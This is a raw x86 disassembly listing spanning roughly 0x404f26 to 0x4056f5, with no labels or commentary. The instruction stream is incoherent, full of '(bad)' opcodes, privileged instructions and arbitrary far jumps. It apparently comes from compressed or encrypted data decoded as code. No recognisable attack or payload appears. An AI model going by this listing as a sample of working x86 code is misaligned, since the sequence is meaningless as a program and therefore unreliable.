  404f26:	mov    ebp,0x2b0a4c60
  404f2b:	hlt    
  404f2c:	loope  0x404ed6
  404f2e:	push   esp
  404f2f:	add    esi,edx
  404f31:	ds add ch,bl
  404f34:	sbb    al,0x90
  404f36:	mov    esi,edx
  404f38:	daa    
  404f39:	mov    al,ds:0xccc1421d
  404f3e:	mov    al,0x0
  404f40:	add    BYTE PTR [eax],al
  404f42:	add    BYTE PTR [eax],al
  404f44:	popf   
  404f45:	sar    esp,0x26
  404f48:	xor    al,0xc0
  404f4a:	lods   eax,DWORD PTR ds:[esi]
  404f4b:	pushf  
  404f4c:	jnp    0x404ee0
  404f4e:	popf   
  404f4f:	or     bh,ch
  404f51:	fisttp WORD PTR [edx]
  404f53:	test   eax,0x3f38b452
  404f58:	mov    ebx,0x748569ad
  404f5d:	mov    ch,0x59
  404f5f:	adc    eax,esp
  404f61:	test   DWORD PTR [edx+eax*4+0x4b],eax
  404f65:	outs   dx,BYTE PTR ds:[esi]
  404f66:	je     0x404f7c
  404f68:	mov    dl,0x87
  404f6a:	and    eax,0x157b3dae
  404f6f:	cmp    bl,cl
  404f71:	sub    BYTE PTR [eax-0x4fe4eb65],al
  404f77:	or     eax,0xb7e1228d
  404f7c:	and    dl,BYTE PTR [eax]
  404f7e:	shl    DWORD PTR [ecx],1
  404f80:	mov    bh,0x29
  404f82:	(bad)  
  404f84:	cwde   
  404f85:	sbb    ch,ah
  404f87:	inc    edx
  404f88:	inc    ecx
  404f89:	and    bh,BYTE PTR [ebp-0x72f0f108]
  404f8f:	outs   dx,BYTE PTR ds:[esi]
  404f90:	js     0x404f16
  404f92:	sbb    ch,cl
  404f94:	outs   dx,DWORD PTR ds:[si]
  404f96:	sub    BYTE PTR [ebx-0x22],bl
  404f99:	test   BYTE PTR [ecx-0x1f],bh
  404f9c:	icebp  
  404f9d:	jnp    0x404fe8
  404f9f:	ja     0x405012
  404fa1:	ficom  WORD PTR [esi-0x1a]
  404fa4:	scas   al,BYTE PTR es:[edi]
  404fa5:	mov    ch,0x64
  404fa7:	jo     0x404fa9
  404fa9:	add    BYTE PTR [eax],al
  404fab:	add    BYTE PTR [eax],al
  404fad:	pop    es
  404fae:	stos   DWORD PTR es:[edi],eax
  404faf:	xor    eax,0x5b5c8ca
  404fb4:	pop    esp
  404fb5:	nop
  404fb6:	pop    eax
  404fb7:	daa    
  404fb8:	sahf   
  404fb9:	mov    edi,0x29ae28c2
  404fbe:	sub    dl,BYTE PTR [eax]
  404fc0:	inc    ebx
  404fc2:	or     BYTE PTR [ecx],dl
  404fc4:	iret   
  404fc5:	dec    ebp
  404fc6:	imul   esi,eax,0xffffffe1
  404fc9:	sbb    al,cl
  404fcb:	psrld  mm4,QWORD PTR [esi-0x1b7cf958]
  404fd2:	xchg   edx,eax
  404fd3:	or     DWORD PTR [ebx+0x26243152],esi
  404fd9:	icebp  
  404fda:	sbb    DWORD PTR ds:0x13a37f16,ebp
  404fe0:	inc    edi
  404fe1:	fstp   st(7)
  404fe3:	cs ja  0x405031
  404fe6:	cmp    BYTE PTR [edx-0x48bd3596],bh
  404fec:	pop    edx
  404fed:	xor    al,0x8a
  404fef:	mov    ebp,0xa508b60b
  404ff4:	cmp    eax,DWORD PTR [eax+0x73]
  404ff7:	inc    ecx
  404ff8:	scas   al,BYTE PTR es:[edi]
  404ff9:	jecxz  0x40500a
  404ffb:	inc    eax
  404ffc:	sahf   
  404ffd:	dec    ebp
  404ffe:	xchg   ecx,eax
  404fff:	pop    eax
  405000:	iret   
  405001:	scas   eax,DWORD PTR es:[edi]
  405002:	sbb    DWORD PTR [esi-0x1],edx
  405005:	cmp    DWORD PTR [edi+0x137cf25e],esp
  40500b:	inc    ebx
  40500c:	ret    0x1d0a
  40500f:	pop    eax
  405010:	xchg   ebx,eax
  405011:	add    BYTE PTR [eax],al
  405013:	add    BYTE PTR [eax],al
  405015:	add    al,al
  405017:	mov    ch,0x56
  405019:	mov    ds:0x36bd442e,eax
  40501e:	xchg   ebp,eax
  40501f:	mov    esi,0x3e2306b4
  405024:	mov    edi,0xa3acb957
  405029:	addr16 daa 
  40502b:	pop    ebp
  40502c:	daa    
  40502d:	jp     0x404fdd
  40502f:	xchg   ebp,eax
  405030:	sub    cl,BYTE PTR [edx+0x18]
  405033:	mov    bl,0xca
  405035:	sbb    ebp,DWORD PTR [ebx+0x7b22ddb4]
  40503b:	inc    esi
  40503c:	push   ebx
  40503d:	(bad)  
  40503e:	std    
  40503f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405040:	and    al,0xff
  405042:	add    eax,0xcf08ad12
  405047:	mov    ebx,0x2db705c2
  40504c:	out    0x3,eax
  40504e:	nop
  40504f:	mov    dl,0xde
  405051:	out    dx,al
  405052:	pusha  
  405053:	jno    0x40506a
  405055:	(bad)  
  405057:	xor    al,0x1c
  405059:	(bad)  
  40505b:	repz inc edx
  40505d:	and    BYTE PTR [ebp-0x4a],dl
  405060:	inc    edx
  405061:	sbb    DWORD PTR [ebp+esi*2+0x11],edi
  405065:	cs aaa 
  405067:	cmp    BYTE PTR [eax],ah
  405069:	inc    ebx
  40506a:	(bad)  
  40506b:	imul   BYTE PTR [esi-0x6955f555]
  405071:	(bad)  
  405072:	sbb    ebp,DWORD PTR [ecx-0x53]
  405075:	mov    eax,ds:0x98842c38
  40507a:	add    BYTE PTR [eax],al
  40507c:	add    BYTE PTR [eax],al
  40507e:	add    BYTE PTR [ecx-0x15],ch
  405081:	dec    edx
  405082:	push   edi
  405083:	iret   
  405084:	scas   al,BYTE PTR es:[edi]
  405085:	pop    edx
  405086:	bound  esi,QWORD PTR [esi+0x7d85696d]
  40508c:	xor    BYTE PTR [eax+0x6c],ch
  40508f:	test   bh,ch
  405091:	sub    al,0xc6
  405093:	add    BYTE PTR [ecx-0x3d8c54ec],0xef
  40509a:	xchg   edi,eax
  40509b:	add    BYTE PTR [ebx],0xc6
  40509e:	mov    al,ds:0x62094451
  4050a3:	out    0x84,eax
  4050a5:	sbb    BYTE PTR [edi-0x12],dl
  4050a8:	(bad)
  4050ab:	and    eax,0xc84ea07
  4050b0:	dec    eax
  4050b1:	push   cs
  4050b2:	imul   ebp,ebp,0x46
  4050b5:	push   edi
  4050b6:	push   edx
  4050b7:	mov    WORD PTR [ecx],cs
  4050b9:	push   ss
  4050ba:	pop    ecx
  4050bb:	out    dx,eax
  4050bc:	fcom   st(4)
  4050be:	push   eax
  4050bf:	jmp    0x537d:0x990f93eb
  4050c6:	push   cs
  4050c7:	jo     0x405117
  4050c9:	adc    bl,BYTE PTR ds:0x2cd19f53
  4050cf:	jbe    0x405081
  4050d1:	nop
  4050d2:	pop    esp
  4050d3:	or     BYTE PTR [esi-0x3adea254],dl
  4050d9:	in     eax,dx
  4050da:	mov    fs,ebp
  4050dc:	je     0x40510c
  4050de:	lahf   
  4050df:	jmp    0x0:0xd86f65
  4050e6:	add    BYTE PTR [eax],al
  4050e8:	sbb    edx,esp
  4050ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050eb:	rcr    DWORD PTR [ebx+eax*1],0xe9
  4050ef:	stos   BYTE PTR es:[edi],al
  4050f0:	and    DWORD PTR [edx],esi
  4050f2:	sub    ah,BYTE PTR [ebx+0x146b214e]
  4050f8:	scas   eax,DWORD PTR es:[edi]
  4050f9:	or     al,0xa4
  4050fb:	and    eax,0x16e53dca
  405100:	lods   eax,DWORD PTR ds:[esi]
  405101:	out    dx,al
  405102:	and    eax,0x66df9c17
  405107:	shl    BYTE PTR [edx+0x49],1
  40510a:	mov    al,ds:0xe17c55c9
  40510f:	repnz cwde 
  405111:	stos   DWORD PTR es:[edi],eax
  405112:	and    bl,bl
  405114:	aaa    
  405115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405116:	arpl   WORD PTR [esi-0x58025b37],dx
  40511c:	data16 mov ch,0xbc
  40511f:	push   esp
  405120:	mov    ds:0xa4557f86,eax
  405125:	push   edi
  405126:	ds xchg edx,eax
  405128:	fucom  st(0)
  40512a:	clc    
  40512b:	mov    esp,edx
  40512d:	repz mov bh,0x0
  405130:	pusha  
  405131:	int    0x9d
  405133:	jne    0x40517e
  405135:	stos   BYTE PTR es:[edi],al
  405136:	scas   al,BYTE PTR es:[edi]
  405137:	xor    al,0xbe
  405139:	bound  esi,QWORD PTR [edx-0x7cca4805]
  40513f:	mov    edx,0x79d078dc
  405144:	in     eax,0x87
  405146:	loope  0x405180
  405148:	sbb    al,BYTE PTR [edi+0x77]
  40514b:	inc    DWORD PTR [eax]
  40514d:	add    BYTE PTR [eax],al
  40514f:	add    BYTE PTR [eax],al
  405151:	adc    edi,DWORD PTR [edx]
  405153:	inc    esi
  405154:	mov    esi,0x7d14f4f8
  405159:	icebp  
  40515a:	and    esp,DWORD PTR [esp+edi*1]
  40515d:	cdq    
  40515e:	stos   DWORD PTR es:[edi],eax
  40515f:	inc    ecx
  405160:	add    eax,0x44709790
  405165:	cmp    ebx,DWORD PTR [ebp-0x65ad78dd]
  40516b:	adc    al,dh
  40516d:	std    
  40516e:	fild   DWORD PTR [esi-0x4c232bff]
  405174:	inc    eax
  405175:	pop    ds
  405176:	shr    eax,1
  405178:	and    esi,0xffffffee
  40517b:	aad    0xc2
  40517d:	popa   
  40517e:	push   ecx
  40517f:	retf   
  405180:	or     eax,0x4cfa6988
  405185:	inc    ebx
  405186:	addr16 test eax,0x98324a8f
  40518c:	into   
  40518d:	test   edx,esi
  40518f:	or     eax,0x3f256c09
  405194:	dec    eax
  405195:	xchg   DWORD PTR [eax],ebp
  405197:	ins    BYTE PTR es:[edi],dx
  405198:	mov    ebx,DWORD PTR [esi]
  40519a:	push   ss
  40519b:	pop    ebp
  40519c:	retf   0x6963
  40519f:	push   ebx
  4051a0:	push   esp
  4051a1:	retf   0x6256
  4051a4:	adc    eax,0xd6313381
  4051a9:	mov    BYTE PTR [eax+eax*1-0x69],ah
  4051ad:	nop
  4051ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051af:	mov    ecx,0xce946098
  4051b4:	test   eax,0x0
  4051b9:	add    BYTE PTR [ecx-0x3d055479],al
  4051bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051c0:	test   bl,cl
  4051c2:	add    ebx,DWORD PTR [ecx]
  4051c4:	das    
  4051c5:	xlat   BYTE PTR ds:[ebx]
  4051c6:	xor    al,0xf0
  4051c8:	add    esi,esp
  4051ca:	lods   eax,DWORD PTR ds:[esi]
  4051cb:	or     edi,DWORD PTR [ecx]
  4051cd:	mov    ch,0xe6
  4051cf:	icebp  
  4051d0:	das    
  4051d1:	test   BYTE PTR [edi],bl
  4051d3:	(bad)  
  4051d5:	adc    DWORD PTR [eax-0x4],ebx
  4051d8:	cmc    
  4051d9:	and    cl,BYTE PTR [ecx-0x35903b11]
  4051df:	sbb    eax,0x2dfb40ec
  4051e4:	sahf   
  4051e5:	imul   ebp,edi,0x4e
  4051e8:	stos   DWORD PTR es:[edi],eax
  4051e9:	pop    edx
  4051ea:	jbe    0x405189
  4051ec:	mov    ch,0x9
  4051ee:	lods   eax,DWORD PTR ds:[esi]
  4051ef:	mov    edi,DWORD PTR [edx+0x79caf438]
  4051f5:	scas   al,BYTE PTR es:[edi]
  4051f6:	xor    esp,edx
  4051f8:	jbe    0x405199
  4051fa:	jb     0x4051d5
  4051fc:	addr16 int3 
  4051fe:	mov    cl,0xbf
  405200:	pop    esi
  405201:	std    
  405202:	lock ss jmp 0xc0a679e9
  405209:	iret   
  40520a:	ds xor eax,0x537582ff
  405210:	repnz mov cl,0xac
  405213:	adc    dh,BYTE PTR ds:0x3c19eb24
  405219:	adc    eax,0x4603313a
  40521e:	add    BYTE PTR [eax],al
  405220:	add    BYTE PTR [eax],al
  405222:	add    BYTE PTR [ecx+0x27],bh
  405225:	es ja  0x4051d0
  405228:	hlt    
  405229:	mov    edi,0xe9241e78
  40522e:	inc    edi
  40522f:	inc    edi
  405230:	mov    bl,0xa
  405232:	std    
  405233:	stos   BYTE PTR es:[edi],al
  405234:	data16 jmp 0x405228
  405237:	test   eax,0x3432aca5
  40523c:	loope  0x4051f2
  40523e:	cmp    ebx,DWORD PTR ds:0xc628ce20
  405244:	(bad)  
  405245:	(bad)  
  405246:	or     eax,0xa540a1ef
  40524b:	jecxz  0x405229
  40524d:	and    BYTE PTR [eax-0x4ccde42e],dl
  405253:	and    DWORD PTR [edi+0x23],ebx
  405256:	mov    edx,0x79649df0
  40525b:	jle    0x405235
  40525d:	jl     0x4052d3
  40525f:	xchg   edi,eax
  405260:	pop    ss
  405261:	ss dec edi
  405263:	cmp    al,0x5a
  405265:	pop    edi
  405266:	xor    ax,0xbc99
  40526a:	cmp    al,0x67
  40526d:	lds    ebp,FWORD PTR [ebx+0x39]
  405270:	test   al,0xfe
  405272:	push   esi
  405273:	mov    ch,cl
  405275:	neg    BYTE PTR [ebp+0x4b]
  405278:	sub    bh,BYTE PTR [eax]
  40527a:	popf   
  40527b:	aad    0x6b
  40527d:	sub    DWORD PTR [eax-0x54a55304],ebx
  405283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405284:	in     eax,dx
  405285:	cmp    al,dl
  405287:	add    BYTE PTR [eax],al
  405289:	add    BYTE PTR [eax],al
  40528b:	add    BYTE PTR [esi-0x7dd54bd2],cl
  405291:	outs   dx,DWORD PTR ds:[esi]
  405292:	int    0x43
  405294:	jae    0x405246
  405296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405297:	and    al,al
  405299:	icebp  
  40529a:	into   
  40529b:	adc    eax,0xd67032d1
  4052a0:	pop    esi
  4052a1:	jae    0x4052f4
  4052a3:	fbstp  TBYTE PTR ds:0xdd0442b4
  4052a9:	hlt    
  4052aa:	xor    ch,cl
  4052ac:	adc    esi,DWORD PTR [esi]
  4052ae:	push   cs
  4052af:	clc    
  4052b0:	shr    BYTE PTR [eax],cl
  4052b2:	adc    al,0x1
  4052b4:	mov    edx,0x9caa5517
  4052b9:	retf   0xc395
  4052bc:	lahf   
  4052bd:	stc    
  4052be:	(bad)  
  4052bf:	cld    
  4052c0:	(bad)  
  4052c1:	imul   edx,DWORD PTR [eax],0xffffffdd
  4052c4:	lds    ebx,FWORD PTR [ecx+edx*2+0xe]
  4052c8:	stc    
  4052c9:	lea    edx,[edx-0x2c416c01]
  4052cf:	jo     0x405335
  4052d1:	mov    dl,0x1c
  4052d3:	mov    DWORD PTR [ecx],edx
  4052d5:	mov    eax,ds:0x5066725d
  4052da:	sahf   
  4052db:	jnp    0x405344
  4052dd:	jg     0x4052be
  4052df:	xor    al,0x18
  4052e1:	cmc    
  4052e2:	pop    ss
  4052e3:	and    eax,0x1658e60d
  4052e8:	rcl    BYTE PTR [edx],cl
  4052ea:	call   0x47:0xdb43eaf7
  4052f1:	add    BYTE PTR [eax],al
  4052f3:	add    BYTE PTR [eax],al
  4052f5:	lea    ebx,[esi]
  4052f7:	out    0x36,eax
  4052f9:	and    BYTE PTR [edi],0xa6
  4052fc:	test   DWORD PTR [edx-0x8],esp
  4052ff:	fs fs pop ecx
  405302:	leave  
  405303:	and    esp,DWORD PTR [ebx-0x451ca468]
  405309:	sub    DWORD PTR [edx-0x5e],0xffffffc1
  40530d:	mov    dh,0xbd
  40530f:	popa   
  405310:	enter  0x8cd5,0x20
  405314:	dec    edi
  405315:	mov    eax,es:0xb2572eef
  40531b:	scas   al,BYTE PTR es:[edi]
  40531c:	cmp    eax,0x2c6d7f24
  405321:	and    DWORD PTR [eax+0x2c],edx
  405324:	jmp    0x405307
  405326:	in     eax,0xea
  405328:	repnz retf 0xa9f4
  40532c:	add    cl,ch
  40532e:	xor    DWORD PTR [edi-0x51b8bf99],ebx
  405334:	es add eax,0x7cb89ff1
  40533a:	pop    es
  40533b:	xchg   ecx,eax
  40533c:	stc    
  40533d:	mov    DWORD PTR [edx-0x3e],0xf33dae3a
  405344:	jnp    0x4053af
  405346:	jl     0x4053ad
  405348:	mov    esp,0xfd548360
  40534d:	imul   eax,DWORD PTR [esi+0x7],0x3e
  405351:	add    dh,BYTE PTR [edx]
  405353:	ss jg  0x4052e3
  405356:	loop   0x405384
  405358:	mov    al,0x0
  40535a:	add    BYTE PTR [eax],al
  40535c:	add    BYTE PTR [eax],al
  40535e:	les    ebp,FWORD PTR [esi-0x3700ee5]
  405364:	dec    edx
  405365:	xor    dh,BYTE PTR [esi-0xe8c87fc]
  40536b:	(bad)
  40536e:	call   0x1436322d
  405373:	jo     0x405302
  405375:	or     cl,BYTE PTR ss:[ecx+0x2b7277bc]
  40537c:	(bad)  [esi-0x55]
  40537f:	adc    al,0xe8
  405381:	pshufw mm3,QWORD PTR [edx],0xbb
  405385:	int3   
  405386:	dec    ecx
  405387:	and    eax,0x640e8d8a
  40538c:	sbb    al,0x4a
  40538e:	pop    es
  40538f:	pop    ebx
  405390:	sub    eax,0x7e4eec0b
  405395:	enter  0x69f5,0x4f
  405399:	mov    DWORD PTR [edx-0x30],ebp
  40539c:	push   ecx
  40539d:	inc    esi
  40539e:	arpl   bp,bp
  4053a0:	fs pop es
  4053a2:	push   0x61c42fe2
  4053a7:	fild   DWORD PTR [edx]
  4053a9:	test   DWORD PTR [eax-0x2d67ca58],edx
  4053af:	test   eax,0xb693a93e
  4053b4:	add    edi,edx
  4053b6:	push   eax
  4053b7:	xchg   DWORD PTR [eax],ebp
  4053b9:	retf   
  4053ba:	adc    DWORD PTR [edx-0x3e],ecx
  4053bd:	les    ebp,FWORD PTR [edi+0xf3e983]
  4053c3:	add    BYTE PTR [eax],al
  4053c5:	add    BYTE PTR [eax],al
  4053c7:	data16 cmp al,0xf4
  4053ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053cb:	sbb    eax,0xd495ff45
  4053d0:	gs add BYTE PTR ds:[ebx+0x4a313567],cl
  4053d8:	mov    eax,0x88f96228
  4053dd:	add    edx,DWORD PTR [ebx-0x48]
  4053e0:	adc    DWORD PTR [edx-0x7cc458b1],ebp
  4053e6:	jle    0x405446
  4053e8:	adc    al,0xbc
  4053ea:	sub    eax,0x1cb92d25
  4053ef:	fsub   st(5),st
  4053f1:	jne    0x40537d
  4053f3:	cmp    edi,0x7e
  4053f6:	mov    ebx,0xe83fd042
  4053fb:	add    ecx,edx
  4053fd:	ins    BYTE PTR es:[edi],dx
  4053fe:	fld    st(0)
  405400:	inc    eax
  405401:	pop    es
  405402:	repz jl 0x405416
  405405:	cs ret 0x7e35
  405409:	xor    dl,BYTE PTR [ecx-0x5fc68112]
  40540f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405410:	ret    
  405411:	clc    
  405412:	xor    eax,0x6f3ad78
  405417:	cmp    edx,esp
  405419:	rcl    BYTE PTR [ebx-0x16],1
  40541c:	cli    
  40541d:	ret    
  40541e:	fs stos DWORD PTR es:[edi],eax
  405420:	ja     0x40548e
  405422:	jns    0x405458
  405424:	jns    0x40546f
  405426:	dec    eax
  405427:	in     eax,dx
  405428:	mov    dl,0x43
  40542a:	je     0x40542c
  40542c:	add    BYTE PTR [eax],al
  40542e:	add    BYTE PTR [eax],al
  405430:	fwait
  405431:	push   eax
  405432:	push   edx
  405433:	jge    0x40549f
  405435:	(bad)  
  405436:	xchg   ebp,eax
  405437:	mov    esi,0xb38bd2ec
  40543c:	adc    eax,0x3e88a712
  405441:	push   ebp
  405442:	scas   al,BYTE PTR es:[edi]
  405443:	mov    eax,ds:0x47d39427
  405448:	icebp  
  405449:	adc    eax,0xd6e062d2
  40544e:	add    BYTE PTR [esi+0x13],bh
  405451:	cwde   
  405452:	adc    BYTE PTR [ebp+0x42],dh
  405455:	pop    ecx
  405456:	xlat   BYTE PTR ds:[ebx]
  405457:	mov    bl,0xb4
  405459:	sbb    esi,ecx
  40545b:	mov    esi,0xa1a4da7d
  405460:	push   esi
  405461:	fwait
  405462:	lods   al,BYTE PTR ds:[esi]
  405463:	mov    BYTE PTR [edi+0x5c],bl
  405466:	sbb    esp,DWORD PTR [eax]
  405468:	cmp    ebx,DWORD PTR ds:0xde6a092a
  40546e:	sbb    BYTE PTR [esi],dh
  405470:	mov    DWORD PTR [edi+0x60783b18],ebx
  405476:	pop    edi
  405477:	cld    
  405478:	std    
  405479:	and    DWORD PTR [esi-0xb],eax
  40547c:	push   es
  40547d:	jecxz  0x4054fb
  40547f:	retf   0xa3cb
  405482:	push   esp
  405483:	fist   WORD PTR [esp+eiz*2-0x4d6ffc19]
  40548a:	out    0xc5,al
  40548c:	cli    
  40548d:	lahf   
  40548e:	in     al,0x7f
  405490:	fs dec eax
  405492:	in     eax,0x41
  405494:	add    BYTE PTR [eax],al
  405496:	add    BYTE PTR [eax],al
  405498:	add    BYTE PTR [esi],dh
  40549a:	jns    0x40547c
  40549c:	cli    
  40549d:	aaa    
  40549e:	imul   al
  4054a0:	mov    esp,0x76e2cb52
  4054a5:	fsub   QWORD PTR [edx+ebp*8]
  4054a8:	cmp    BYTE PTR [esi+0x2d],bh
  4054ab:	push   cs
  4054ac:	out    0x44,eax
  4054ae:	xor    BYTE PTR [esi-0x7e64fd22],0xf4
  4054b5:	shr    BYTE PTR ds:0xc766edd8,0xee
  4054bc:	loopne 0x4054fb
  4054be:	fisubr DWORD PTR [ecx-0x1f]
  4054c1:	sti    
  4054c2:	inc    edx
  4054c3:	pop    ebp
  4054c4:	repz test eax,0x6ff20485
  4054ca:	outs   dx,DWORD PTR ds:[esi]
  4054cb:	xor    edx,ebp
  4054cd:	icebp  
  4054ce:	adc    edi,DWORD PTR [esi-0x34]
  4054d1:	daa    
  4054d2:	jmp    0x5fb65b1f
  4054d7:	adc    bh,bh
  4054d9:	mov    bl,0xb5
  4054db:	daa    
  4054dc:	repnz enter 0xa2ab,0xf3
  4054e1:	(bad)  
  4054e2:	push   eax
  4054e3:	xchg   ebp,eax
  4054e4:	loope  0x405522
  4054e6:	test   ebx,0xfb1d7ae0
  4054ec:	fcmovnu st,st(6)
  4054ee:	loopne 0x4054b5
  4054f0:	fisub  DWORD PTR [eax]
  4054f2:	cmp    dh,cl
  4054f4:	clc    
  4054f5:	bound  edx,QWORD PTR [eax+0x669cf9a8]
  4054fb:	lahf   
  4054fc:	cld    
  4054fd:	add    BYTE PTR [eax],al
  4054ff:	add    BYTE PTR [eax],al
  405501:	add    bh,dl
  405503:	js     0x40551f
  405505:	cmc    
  405506:	sbb    DWORD PTR [edx+0x284bdf2d],esp
  40550c:	je     0x4054e4
  40550e:	test   esi,ecx
  405510:	inc    edx
  405511:	mov    cl,0xc6
  405513:	ins    BYTE PTR es:[edi],dx
  405514:	out    dx,al
  405515:	mov    al,0x8
  405517:	xchg   ecx,ebx
  405519:	and    bh,BYTE PTR [ebx]
  40551b:	inc    ecx
  40551c:	and    BYTE PTR [ebx],0x75
  40551f:	fidiv  WORD PTR [esi+0x31c4d016]
  405525:	movlps xmm5,QWORD PTR [edi]
  405528:	add    eax,0x33ee9500
  40552d:	push   edx
  40552e:	push   esp
  40552f:	mov    al,0x5e
  405531:	gs dec edi
  405533:	mov    WORD PTR [ecx],ds
  405535:	pop    eax
  405536:	ds dec esi
  405538:	jae    0x4055a9
  40553a:	pop    esp
  40553b:	or     ch,cl
  40553d:	ss pop ebp
  40553f:	retf   0x1a5
  405542:	dec    eax
  405543:	mov    ds:0x454984b1,eax
  405548:	(bad)  [ebx-0x159ae125]
  40554e:	(bad)  
  405550:	or     eax,0xebb6dddd
  405555:	nop
  405556:	int3   
  405557:	js     0x4054da
  405559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40555a:	mov    ?,WORD PTR [ebx]
  40555c:	aas    
  40555d:	dec    BYTE PTR [edi-0x6536ac03]
  405563:	mov    WORD PTR [ebx+0x4c],es
  405566:	add    BYTE PTR [eax],al
  405568:	add    BYTE PTR [eax],al
  40556a:	add    BYTE PTR [ebx-0x7684d6b2],bl
  405570:	adc    BYTE PTR [edi-0x42d77de],dl
  405576:	adc    eax,0x28baa693
  40557b:	xchg   edx,eax
  40557c:	rcr    BYTE PTR fs:[edi],1
  40557f:	loopne 0x4055ae
  405581:	outs   dx,BYTE PTR ds:[esi]
  405582:	inc    esi
  405583:	loope  0x405570
  405585:	push   es
  405586:	jno    0x40555c
  405588:	rcl    BYTE PTR [edx],0xf4
  40558b:	in     eax,0x7e
  40558d:	js     0x405552
  40558f:	(bad)  
  405590:	and    al,0xc6
  405592:	call   0x4809:0xadaf02c6
  405599:	add    eax,0x8
  40559c:	mov    ch,cl
  40559e:	neg    edx
  4055a0:	int3   
  4055a1:	push   ebp
  4055a2:	scas   al,BYTE PTR es:[edi]
  4055a3:	fisttp DWORD PTR [edx]
  4055a5:	cmp    eax,0x7d749099
  4055aa:	and    eax,0x4f3b7d84
  4055af:	stos   DWORD PTR es:[edi],eax
  4055b0:	xchg   edi,eax
  4055b1:	loope  0x4055a3
  4055b3:	loop   0x405553
  4055b5:	mov    edi,0x739dd59b
  4055ba:	fmul   st(0),st
  4055bc:	test   BYTE PTR ds:0xf78ecfb6,dh
  4055c2:	pop    es
  4055c3:	sahf   
  4055c4:	mov    bh,0xb9
  4055c6:	bound  esi,QWORD PTR [ecx-0x3e]
  4055c9:	mov    dh,BYTE PTR [esp+ebp*8-0x3e]
  4055cd:	dec    esp
  4055ce:	push   ds
  4055cf:	add    BYTE PTR [eax],al
  4055d1:	add    BYTE PTR [eax],al
  4055d3:	add    BYTE PTR [ebx],al
  4055d5:	mov    cl,0xe
  4055d7:	mov    al,ds:0xcab0b04a
  4055dc:	or     eax,0x402e46af
  4055e1:	(bad)  
  4055e2:	or     al,BYTE PTR [edi+edx*1-0x4]
  4055e6:	(bad)  
  4055e7:	stc    
  4055e8:	(bad)  
  4055e9:	in     al,0x86
  4055eb:	nop
  4055ec:	stc    
  4055ed:	out    dx,eax
  4055ee:	pop    ebp
  4055ef:	xchg   BYTE PTR [ecx+esi*8-0x1],dh
  4055f3:	jmp    0x405630
  4055f5:	add    ebx,edx
  4055f7:	push   ecx
  4055f8:	xchg   edx,eax
  4055f9:	add    bl,BYTE PTR [eax+edi*1+0x7f57e985]
  405600:	cwde   
  405601:	call   0x2abf6b1b
  405606:	aam    0xaa
  405608:	sub    edx,DWORD PTR cs:[edx+0x532641c1]
  40560f:	xlat   BYTE PTR ds:[ebx]
  405610:	mov    esp,0xb3bd112e
  405615:	and    al,0xef
  405617:	add    bl,dl
  405619:	sub    ebp,DWORD PTR [ebp-0x5fede297]
  40561f:	retf   
  405620:	mov    al,0x12
  405622:	(bad)  
  405623:	mov    al,ds:0x333cb2a7
  405628:	xchg   edi,eax
  405629:	fs cmp eax,0x2859e575
  40562f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405630:	repz (bad) 
  405632:	adc    al,ch
  405634:	mov    bh,ah
  405636:	cmp    ch,BYTE PTR [edx]
  405638:	add    BYTE PTR [eax],al
  40563a:	add    BYTE PTR [eax],al
  40563c:	add    BYTE PTR [edi],bl
  40563e:	inc    ecx
  40563f:	and    ch,BYTE PTR [ebp+ebp*2+0xe]
  405643:	and    eax,eax
  405645:	sub    bh,BYTE PTR [ebx]
  405647:	sub    dh,bh
  405649:	das    
  40564a:	add    al,0x22
  40564c:	inc    esp
  40564d:	(bad)  
  40564e:	fsubr  QWORD PTR [edx]
  405650:	xor    BYTE PTR [ecx+esi*8+0x25],0xb9
  405655:	bound  ebp,QWORD PTR [esi+0x27]
  405658:	test   edi,0x2e3d255f
  40565e:	mov    DWORD PTR [ebx+edi*2],esp
  405661:	sbb    al,0xb6
  405663:	adc    edx,DWORD PTR [ebp-0x2ce57d88]
  405669:	xchg   ecx,eax
  40566a:	dec    ebx
  40566b:	mov    al,0x10
  40566d:	xor    al,0x95
  40566f:	mov    ecx,0xb4a9c64e
  405674:	mov    edx,eax
  405676:	es mov ch,0xc9
  405679:	sub    DWORD PTR [eax],ebx
  40567b:	xchg   edi,eax
  40567c:	pop    es
  40567d:	jl     0x40564f
  40567f:	xchg   ebp,eax
  405680:	inc    ebp
  405681:	dec    esi
  405682:	std    
  405683:	pushf  
  405684:	mov    eax,ds:0xe39bca89
  405689:	(bad)
  40568e:	sub    al,0xcf
  405690:	pop    edi
  405691:	pop    ss
  405692:	and    bh,BYTE PTR [edx-0x5c60fe66]
  405698:	fcomp  QWORD PTR [edx+0x4d16a9af]
  40569e:	js     0x405630
  4056a0:	pop    eax
  4056a1:	add    BYTE PTR [eax],al
  4056a3:	add    BYTE PTR [eax],al
  4056a5:	add    BYTE PTR [edi+0x60080e45],bh
  4056ab:	mov    eax,0x610e098e
  4056b0:	mov    ecx,0xdfe3e3cb
  4056b5:	retf   0xd81
  4056b8:	xlat   BYTE PTR ds:[ebx]
  4056b9:	iret   
  4056ba:	pop    eax
  4056bb:	and    BYTE PTR [edx-0x3a],dl
  4056be:	push   ss
  4056bf:	stc    
  4056c0:	fs int3 
  4056c2:	les    ecx,FWORD PTR [ebx+0x3c]
  4056c5:	lds    ebx,FWORD PTR [edx+0x66c60ba5]
  4056cb:	imul   esi,DWORD PTR [esi],0x191f0bf
  4056d1:	xchg   ebp,eax
  4056d2:	mov    dl,0x34
  4056d4:	pop    eax
  4056d5:	mov    WORD PTR [esi+ebx*8+0x6e],?
  4056d9:	cmp    DWORD PTR ds:0x780e9d1,0xb992dd2a
  4056e3:	pushf  
  4056e4:	test   BYTE PTR [ebx+0x74b376ab],dl
  4056ea:	add    DWORD PTR [ebx],ebx
  4056ec:	(bad)  
  4056ed:	ins    DWORD PTR es:[edi],dx
  4056ee:	inc    ebx
  4056ef:	add    cl,cl
  4056f1:	addr16 gs inc esi
  4056f4:	nop
  4056f5:	pop    esi
